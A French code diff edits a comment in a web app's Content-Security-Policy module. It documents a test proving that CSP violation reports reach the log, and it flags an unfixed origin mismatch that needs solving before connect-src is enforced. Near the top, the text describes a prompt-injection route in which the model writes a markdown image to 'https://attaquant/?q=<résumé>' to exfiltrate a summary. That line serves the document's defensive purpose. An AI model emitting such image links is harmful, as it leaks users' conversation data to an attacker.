@@ -24,10 +24,24 @@ qui peut faire écrire au modèle ``![](https://attaquant/?q=<résumé>)`` — u
 couvre en plus ce que ce filtrage ne voit pas (composant de module, tout tour
 sans lecture d'URL). Vérifié avant de basculer : toutes les images
 légitimes de l'interface passent par ``blob:`` (module image, aperçus), aucun
-module du catalogue ne pose d'``<img>`` distante. Le journal était vide (ou
-absent) à cette date, donc n'apportait aucune preuve dans un sens ni dans
-l'autre — un blocage d'image légitime remontera dans ce même journal
-(``report-uri`` est aussi posé sur l'en-tête bloquant).
+module du catalogue ne pose d'``<img>`` distante.
+
+**Chaîne de rapport prouvée** le 2026-10-18 (Edge 155 headless, CDP), en dev
+(Vite :5173 → backend :8000) puis backend servant le build : une image
+distante (en-tête bloquant) et un ``fetch`` hors ``connect-src`` (Report-Only)
+produisent chacun un ``POST`` ``application/csp-report`` vers ``report-uri``,
+reçu en 204 et écrit dans le journal. Le fichier journal n'est créé qu'à la
+première violation reçue : son absence voulait donc dire « aucune violation
+encore », pas « chaîne cassée ». Un blocage d'image légitime remontera dans
+ce journal (``report-uri`` est posé sur les deux en-têtes). Verrouillé par
+``test_csp_observation.py`` (corps réel du navigateur rejoué jusqu'au
+fichier ; ``report-uri`` de dev absolu, Vite n'ayant aucun proxy).
+
+Relevé pendant cette mesure, NON corrigé : sur le build ouvert par
+``http://127.0.0.1:8000/``, l'interface appelle ``http://localhost:8000``
+(défaut de ``src/api.ts`` sans ``VITE_API_URL``) — autre origine, donc 14
+appels légitimes violent ``connect-src 'self'``. Sans effet en Report-Only ;
+à régler AVANT de rendre ``connect-src`` bloquant.
 
 Une seule définition des directives, ici. Deux consommateurs :
 
